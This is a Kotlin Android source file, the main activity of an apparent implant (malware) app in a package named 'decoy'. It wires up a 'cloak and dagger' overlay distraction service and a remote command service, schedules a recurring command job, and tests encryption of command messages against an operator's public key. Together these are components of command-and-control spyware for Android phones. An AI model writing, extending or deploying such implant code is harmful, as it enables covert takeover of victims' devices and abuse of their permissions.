package com.cooperthecoder.implant.decoy

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.widget.Button
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.R
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.command.CommandService
import com.cooperthecoder.implant.command.jobs.StartCommandServiceJob
import com.cooperthecoder.implant.crypto.Base64KeyPair
import com.cooperthecoder.implant.crypto.NetworkEncryption
import com.cooperthecoder.implant.dagger.DaggerService
import com.cooperthecoder.implant.data.SharedPreferencesQuery


class MainActivity : AppCompatActivity() {

    companion object {
        val TAG = MainActivity::class.java.name
    }

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val cloakAndDaggerBtn = findViewById<Button>(R.id.btn_cloak_and_dagger_demo)
        val encryptionTestBtn = findViewById<Button>(R.id.btn_encryption_demo)
        val commandServiceTestBtn = findViewById<Button>(R.id.btn_command_service)
        cloakAndDaggerBtn.setOnClickListener {
            if (!overlayPermissionRequired()) {
                startCloakService()
            }
        }

        encryptionTestBtn.setOnClickListener {
            startEncryptionTest()
        }

        commandServiceTestBtn.setOnClickListener {
            startCommandService()
        }

        if (SharedPreferencesQuery.commandJobIsScheduled(this)) {
            StartCommandServiceJob.schedule()
            SharedPreferencesQuery.scheduleCommandJob(this)
        }
    }

    private fun startEncryptionTest() {
        val message = "{\"command\":\"pin\",\"nonce\":\"3e7376be-9a10-46a9-b0aa-3f1174aabfb0\",\"arguments\":{}}"
        val keypair = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(this))
        val ne = NetworkEncryption(Config.OPERATOR_PUBLIC_KEY, keypair.privateKeyBase64())
        val ciphertext = ne.encrypt(message)
        Log.d(TAG, "Ciphertext: $ciphertext")
        val plaintext = ne.decrypt(ciphertext)
        Log.d(TAG, "Plaintext: $plaintext")
    }

    override fun onResume() {
        super.onResume()
    }

    private fun startCommandService() {
        startService(CommandService.intent(this))
    }

    private fun startCloakService() {
        // No need for the cloak if the dagger already came out
        if (!DaggerService.isRunning()) {
            CloakService.startDaggerDistraction(this)
            finish()
        }
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startCloakService()
        }
    }
}
